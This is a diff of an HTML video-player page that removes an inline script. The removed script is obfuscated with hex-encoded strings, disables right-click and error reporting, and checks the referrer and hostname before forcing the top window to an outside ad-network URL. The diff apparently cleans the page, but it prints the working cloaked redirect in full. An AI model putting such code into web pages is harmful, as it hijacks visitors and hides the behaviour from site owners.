@@ -54,56 +54,7 @@
         </style>
     </head>
     <body oncontextmenu='return false' style='background:#000'>
-        <script>
-            cookieChoices = {};
-            window.onerror = function() {
-                return true
-            }
-            ;
-            window.onload = function() {
-                document.addEventListener('contextmenu', function(e) {
-                    e.preventDefault()
-                }, false);
-                function disabledEvent(e) {
-                    if (e.stopPropagation) {
-                        e.stopPropagation()
-                    } else if (window.event) {
-                        window.event.cancelBubble = true
-                    }
-                    ;e.preventDefault();
-                    return false
-                }
-            }
-            ;
-            b = decodeURIComponent(location['\x68\x72\x65\x66']);
-            sURL = b;
-            A0 = '\x26\x7A\x79\x3D';
-            if (b['\x69\x6E\x64\x65\x78\x4F\x66'](A0) > -1) {
-                sURL = b['\x73\x70\x6C\x69\x74'](A0)[1]
-            }
-            u = '\x68\x74\x74\x70\x73\x3A\x2F\x2F';
-            t = '\x68\x74\x74\x70\x3A\x2F\x2F';
-            s = '\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E';
-            im1 = '\x65\x66\x66\x65\x63\x74\x69\x76\x65\x72\x61\x74\x65\x63\x70\x6D\x2E\x63\x6F\x6D\x2F';
-            izi = t + im1 + '\x66\x78\x74\x31\x71\x6D\x32\x79\x6B\x3F\x6B\x65\x79\x3D\x39\x61\x34\x34\x38\x66\x63\x66\x38\x38\x39\x33\x34\x30\x35\x65\x35\x64\x34\x65\x63\x31\x65\x38\x64\x34\x62\x37\x34\x32\x61\x38';
-            lH = location['\x68\x72\x65\x66'];
-            tL = document['\x72\x65\x66\x65\x72\x72\x65\x72'];
-            tL = tL['\x72\x65\x70\x6C\x61\x63\x65']('\x62\x6C\x6F\x67\x74\x76\x2E\x70\x61\x67\x65\x73\x2E', '\x61' + s);
-            lh = lH['\x73\x70\x6C\x69\x74']('\x2E')[0];
-            tl = tL['\x73\x70\x6C\x69\x74']('\x2E')[0];
-            rw = 0;
-            if (lH['\x69\x6E\x64\x65\x78\x4F\x66'](s) < 0 || tL['\x69\x6E\x64\x65\x78\x4F\x66'](s) < 0 || tl['\x69\x6E\x64\x65\x78\x4F\x66']('\x79\x61\x6C\x6C\x61') > -1 || tl['\x69\x6E\x64\x65\x78\x4F\x66']('\x65\x61\x73\x74') > -1 || tl['\x69\x6E\x64\x65\x78\x4F\x66']('\x73\x70\x6F\x72\x74') > -1 || lh['\x69\x6E\x64\x65\x78\x4F\x66']('\x79\x61\x6C\x6C\x61') > -1 || lh['\x69\x6E\x64\x65\x78\x4F\x66']('\x65\x61\x73\x74') > -1 || lh['\x69\x6E\x64\x65\x78\x4F\x66']('\x73\x70\x6F\x72\x74') > -1) {
-                rw = 1
-            }
-            ;if (b['\x69\x6E\x64\x65\x78\x4F\x66']('\x3D\x31\x30') > -1) {
-                rw = 0
-            }
-            ;if (rw > 0) {
-                sURL = '';
-                window['\x74\x6F\x70']['\x6C\x6F\x63\x61\x74\x69\x6F\x6E'] = izi;
-                window['\x6C\x6F\x63\x61\x74\x69\x6F\x6E']['\x72\x65\x70\x6C\x61\x63\x65'](izi)
-            }
-        </script>
+       
         <div class='video-section video-responsive'>
             <video id='player' loop autoplay muted controls playsinline crossorigin></video>
         </div>
